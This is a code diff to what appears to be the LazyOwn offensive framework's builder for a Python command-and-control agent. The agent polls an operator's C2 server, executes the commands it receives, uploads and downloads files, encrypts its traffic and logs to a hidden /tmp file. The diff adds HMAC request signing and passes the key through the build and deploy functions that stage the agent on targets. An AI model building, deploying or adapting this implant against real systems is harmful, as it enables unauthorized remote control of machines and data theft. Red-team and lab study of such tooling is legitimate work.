@@ -122,6 +122,8 @@ AGENT_TEMPLATE = """#!/usr/bin/env python
 # LazyOwn malleable lab agent (python2.5 stdlib + openssl CLI only).
 # Polls {C2}{ROUTE}{ID}, executes, reports. Specials: download:<f>, upload:<f>.
 import base64
+import hashlib
+import hmac
 import httplib
 import os
 import socket
@@ -133,6 +135,7 @@ C2 = "{C2}"
 ROUTE = "{ROUTE}"
 ID = "{ID}"
 KEY = "{KEY}"
+RATKEY = "{RATKEY}"
 SLEEP = {SLEEP}
 TIMEOUT = 25
 LOG = "/tmp/.agent.log"
@@ -149,6 +152,13 @@ def _log(msg):
         open(LOG, "a").write(msg + "\\n")
     except Exception:
         pass
+
+
+def _sign(data):
+    try:
+        return hmac.new(RATKEY, data, hashlib.sha256).hexdigest()
+    except Exception:
+        return ""
 
 
 def _sh(cmd):
@@ -191,7 +201,8 @@ def _aes_encrypt_b64(plain):
 
 def _get(path):
     try:
-        return urllib2.urlopen(C2 + path).read()
+        req = urllib2.Request(C2 + path, headers={"X-Signature": _sign("")})
+        return urllib2.urlopen(req).read()
     except Exception, e:
         _log("GET failed: " + str(e))
         return None
@@ -199,7 +210,8 @@ def _get(path):
 
 def _post(path, body, ctype="application/octet-stream"):
     try:
-        req = urllib2.Request(C2 + path, data=body, headers={"Content-Type": ctype})
+        headers = {"Content-Type": ctype, "X-Signature": _sign(body)}
+        req = urllib2.Request(C2 + path, data=body, headers=headers)
         return urllib2.urlopen(req).read()
     except Exception, e:
         _log("POST failed: " + str(e))
@@ -377,6 +389,7 @@ def build_agent(
     c2_url: str,
     client_id: str,
     aes_hex: str,
+    rat_key: str = "",
     route: str = "",
     sleep: int = 10,
     privilege: str = LOW_PRIVILEGE,
@@ -387,6 +400,7 @@ def build_agent(
         c2_url: Base C2 URL (http or https).
         client_id: Stable target-id handle for command pairing.
         aes_hex: Shared 64-hex AES-256 key.
+        rat_key: Session HMAC signing key (64-hex) for X-Signature headers.
         route: Malleable listener route (default ``/``).
         sleep: Beacon sleep seconds, clamped 2..300.
         privilege: ``lowpriv`` (default) or ``root`` profile — only the
@@ -404,6 +418,16 @@ def build_agent(
     key = (aes_hex or "").strip().lower()
     if not re.fullmatch(r"[0-9a-f]{64}", key):
         raise ValueError("AES key must be 64 hex chars (AES-256)")
+    rat = (rat_key or "").strip().lower()
+    if not rat:
+        try:
+            from core.session_secrets import ensure_session_secrets
+
+            rat = ensure_session_secrets(rotate=False)["rat_key"]
+        except Exception as exc:
+            raise ValueError(f"rat_key unavailable for agent build: {exc}")
+    if not re.fullmatch(r"[0-9a-f]{32,128}", rat):
+        raise ValueError("rat_key must be 32-128 hex chars")
     url = (c2_url or "").rstrip("/")
     if not re.match(r"^https?://", url):
         raise ValueError(f"C2 URL must be http(s): {c2_url!r}")
@@ -419,6 +443,7 @@ def build_agent(
     else:
         text = text.replace("{ID}", validate_client_id(client_id))
     text = text.replace("{KEY}", key)
+    text = text.replace("{RATKEY}", rat)
     text = text.replace("{SLEEP}", str(max(2, min(int(sleep), 300))))
     return text
 
@@ -533,7 +558,21 @@ def deploy(
     is_root = wanted == ROOT_PRIVILEGE
     client_id = client_id_for(target, privilege=wanted)
     aes_hex = _ensure_key()
-    agent = build_agent(c2_base, client_id, aes_hex, route=route, sleep=sleep, privilege=wanted)
+    try:
+        from core.session_secrets import ensure_session_secrets
+
+        rat_key = ensure_session_secrets(rotate=False)["rat_key"]
+    except Exception as exc:
+        raise RuntimeError(f"Session rat_key unavailable for agent build: {exc}")
+    agent = build_agent(
+        c2_base,
+        client_id,
+        aes_hex,
+        rat_key=rat_key,
+        route=route,
+        sleep=sleep,
+        privilege=wanted,
+    )
     recently = "sysagent-r" if is_root else "sysagent"
     staged = _SESSIONS_DIR / "temp_uploads" / f"agent_{client_id}.py"
     staged.parent.mkdir(parents=True, exist_ok=True)
